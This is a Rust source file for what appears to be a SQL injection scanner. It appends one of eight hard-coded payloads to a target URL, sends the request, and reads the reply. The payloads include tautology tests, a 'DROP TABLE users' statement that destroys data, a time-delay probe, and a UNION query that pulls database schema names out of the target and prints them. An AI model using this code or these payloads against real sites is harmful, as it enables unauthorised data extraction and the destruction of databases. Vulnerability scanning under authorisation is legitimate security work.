use reqwest::Client;
use regex::Regex;
use scraper::{Html, Selector};

pub async fn validation_exist_sql_injection(
    url: &str,
    payload: &str) -> Result<(), reqwest::Error> {

    let client = Client::new();

    match payload {
        "1" => {
            let set_payload = "' OR '1'='1";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "2" => {
            let set_payload = "'; DROP TABLE users; --";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "3" => {
            let set_payload = "'; WAITFOR DELAY '00:00:05'--";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "4" => {
            let set_payload = "' AND 1=1 --";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "5" => {
            let set_payload = "' AND 1=0 --";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "6" => {
            let set_payload = "' OR 1=0 --";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "7" => {
            let set_payload = "' OR 1=1 --";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                false).await {

                println!("Request error: {}", error);
            }
        },
        "8" => {
            let set_payload = "-1 union select 1, 2, group_concat(schema_name) from \
            information_schema.schemata";

            if let Err(error) = response(
                client.clone(),
                url,
                set_payload,
                true).await {

                println!("Request error: {}", error);
            }
        }
        _ => println!("Options not found")
    }

    Ok(())
}

async fn response(
    client: Client,
    url: &str,
    payload: &str,
    show_body: bool) -> Result<(), reqwest::Error> {

    let test_url = format!("{}{}", url, payload);
    println!("... Testing");

    let response = client.get(test_url).send().await?;

    if response.status().is_success() {
        let body = response.text().await?;

        if show_body == false {
            contains_sql_injection(body);
        } else {
            extract_information_schema(&body);
        }
    } else {
        println!("Failed to make the request")
    }

    Ok(())
}

fn contains_sql_injection(body: String) {
    if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
        println!("Using this URL it is possible to carry out a SQL Injection attack");
    } else {
        println!("No vulnerabilities found");
    }
}

fn extract_information_schema(html_content: &str) {
    let document = Html::parse_document(html_content);
    let selector = Selector::parse("div, p").unwrap();

    let css_regex = Regex::new(r"\{.*?\}").unwrap();

    for element in document.select(&selector) {
        let text = element.text().collect::<Vec<_>>().join(" ");

        if text.contains("information_schema") && !css_regex.is_match(&text) {
            println!("{}", text.trim());
            break;
        }
    }
}